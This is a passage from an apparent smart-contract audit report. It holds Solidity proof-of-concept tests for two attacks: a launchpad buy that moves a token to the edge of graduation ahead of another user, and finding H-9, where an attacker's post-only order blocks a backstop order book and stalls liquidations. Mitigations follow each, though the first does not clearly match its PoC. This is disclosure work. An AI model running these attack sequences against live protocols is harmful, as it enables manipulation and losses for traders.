import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {LaunchToken} from "contracts/launchpad/LaunchToken.sol";



contract PoCLaunchpad is LaunchpadTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * - factory: ERC1967Factory.sol
     * - launchpad: Launchpad.sol
     * - distributor: Distributor.sol
     * - curve: SimpleBondingCurve.sol
     * - launchpadLPVault: LaunchpadLPVault.sol
     * - quoteToken: Quote token used in Launchpad system
     * - uniV2Router: Uniswap V2 Router used in Launchpad system
     */
    function test_submissionValidity() external {
       address attacker = makeAddr("attacker");
        address user2 = makeAddr("user2");
        deal(address(quoteToken), user, 100_000_000 ether);
        deal(address(quoteToken), user2, 100_000_000 ether);
        deal(address(quoteToken), attacker, 100_000_000_000_000_000_000_000 ether);




        // get amount needed for first user to buy 200 ether in tokens (used for another attack POC)
        uint256 quoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);



        // get bonding amount
        uint256 bondingAmount = SimpleBondingCurve(address(curve)).bondingSupply(token);
        console.log("bondingAmount: ", bondingAmount);

        // get quote needed for bonding amount
        uint256 quoteNeeded = launchpad.quoteQuoteForBase(token, bondingAmount, true);
        console.log("quote amount needed: ", quoteNeeded);

        // getting the token close to graduation event 
        ILaunchpad.BuyData memory data = ILaunchpad.BuyData({
            account: attacker,
            token: token,
            recipient: attacker,
            amountOutBase: bondingAmount - 200_000_0, // 200_000_0
            maxAmountInQuote: quoteNeeded
        });
        vm.startPrank(attacker);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(data);
        vm.stopPrank();


        // get amount needed for first user to buy 200 ether in tokens 
        uint256 newquoteAmountNeededForUser = launchpad.quoteQuoteForBase(token, 200 ether, true);
        console.log("new quote amount needed for user:  ", newquoteAmountNeededForUser);

        ILaunchpad.BuyData memory data2 = ILaunchpad.BuyData({
            account: user2,
            token: token,
            recipient: user2,
            amountOutBase: 200 ether,
            maxAmountInQuote: quoteAmountNeededForUser
        });

        console.log("-> user amount of quoteToken before buy: ",ERC20(address(quoteToken)).balanceOf(user2) );

        // user 2 tries to buy token for 200 eth  
        vm.startPrank(user2);
        quoteToken.approve(address(launchpad), type(uint256).max);
        launchpad.buy(data2);
        vm.stopPrank();

        // log results
        console.log("user amount of token after buy", ERC20(token).balanceOf(user2));
        console.log("-> user amount of quoteToken after buy:  ",ERC20(address(quoteToken)).balanceOf(user2) );

    }

}
```

**Recommended Mitigation:** 
After enough rewards have been added automatically send those rewards to the users.



### [H-9] Dos on liquidation caused by attacker blocking one side of the backstop orderBook.


**Description:** The backstop order book only accepts MOC (post-only) orders. An attacker can pin a resting order at (or near) the limit/edge price , effectively locking one side of the book. When a liquidation requires fills from the blocked side, the backstop cannot execute, causing liquidation attempts to stall and losses to increase. Due to liquidators being the only ones that can fill the orders in liquidation events the orderBook can be cleared only by canceling the blocking order but an attacker can place the order in the next transaction and continue to block the liquidation.

**Impact:** Positions can not be liquidated via the backstop orderBook leading to an increase in losses. 

**Proof of Concept:** The scenario depicted in the Poc assumes the divergence cap is 20%. The actual test setup is built with a 100% divergence cap meaning that in order to completly block one side of the book with the provided setup the limitPrice needed must be set to 200% of the current mark price. 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PerpManagerTestBase} from "../perps/PerpManagerTestBase.sol";
import {console} from "forge-std/Test.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";

import {FixedPointMathLib} from "@solady/utils/FixedPointMathLib.sol";
import {SafeCastLib} from "@solady/utils/SafeCastLib.sol";

import "../../contracts/perps/types/Enums.sol";
import "../../contracts/perps/types/Structs.sol";

contract PoCPerps is PerpManagerTestBase {
     using FixedPointMathLib for *;
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * ================PERPETUAL================
     * - factory: ERC1967Factory.sol 
     * - perpManager: MockPerpManager.sol (extends PerpManager.sol)
     * - gtl: GTL.sol 
     * - usdc: Test USDC within perpetual system
     * - ETH, GTE, BTC: Tickers for markets created
     */
    function test_submissionValidity() external {

        Position memory position = Position({
            isLong: false ,
            amount: 10 ether,
            openNotional:20000 ether,
            leverage: 1e18,
            lastCumulativeFunding: 100

        });
        perpManager.mockSetMargin(rite,0,1 ether);
        perpManager.mockSetMargin(julien,0,10 ether);

        perpManager.mockSetCumulativeFunding(ETH,105);
        perpManager.mockOpenPosition(ETH,rite,0,position,1000 ether);
        perpManager.mockSetMarkPrice(ETH,8000 ether);
        perpManager.mockSetPosition(rite,0,ETH,position);

        _createMocOrderBackstop(ETH,julien,0,10000 ether,3 ether, Side.BUY);
        _createMocOrderBackstop(ETH,nate,0,10000 ether,3 ether, Side.SELL); // this will revert with  PostOnlyOrderWouldBeFilled() error

        // trying to liquidate position (it will never reach this part)
        vm.startPrank(admin);
        perpManager.insuranceFundDeposit(10000000000 ether);
        perpManager.backstopLiquidate(ETH, rite,0);
        vm.stopPrank();

    }

    function _createIocOrder( 
        bytes32 asset,
        address maker,
        uint256 subaccount,
        uint256 price,
        uint256 amount,
        Side side) internal returns (uint256 orderId) {

        vm.startPrank(maker);

        perpManager.deposit(
            maker,
            amount.fullMulDiv(price, 1e18).fullMulDiv(1e18, perpManager.getPositionLeverage(asset, maker, subaccount))
        );

        PlaceOrderArgs memory makerArgs = PlaceOrderArgs({
            subaccount: subaccount,
            asset: asset,
            side: side,
            limitPrice: price,
            amount: amount,
            baseDenominated: true,
            tif: TiF.GTC,
            expiryTime: 0,
            clientOrderId: 0,
            reduceOnly: false
        });

        orderId = perpManager.placeOrder(maker, makerArgs).orderId;

        vm.stopPrank();
    }

      function _createMocOrderBackstop( 
        bytes32 asset,
        address maker,
        uint256 subaccount,
        uint256 price,
        uint256 amount,
        Side side) internal returns (uint256 orderId) {

        vm.startPrank(maker);

        perpManager.deposit(
            maker,
            amount.fullMulDiv(price, 1e18).fullMulDiv(1e18, perpManager.getPositionLeverage(asset, maker, subaccount))
        );

        PlaceOrderArgs memory makerArgs = PlaceOrderArgs({
            subaccount: subaccount,
            asset: asset,
            side: side,
            limitPrice: price,
            amount: amount,
            baseDenominated: true,
            tif: TiF.MOC,
            expiryTime: 0,
            clientOrderId: 0,
            reduceOnly: false
        });

        orderId = perpManager.postLimitOrderBackstop(maker, makerArgs).orderId;

        vm.stopPrank();


    }
}
```

**Recommended Mitigation:** 
- Clear separation betwen the normal orderbook logic and backstop logic.
- Ensure the backstop accepts orders on either side without attempting to auto-fill on post, so that posting on one side cannot prevent opposing orders required for liquidation.











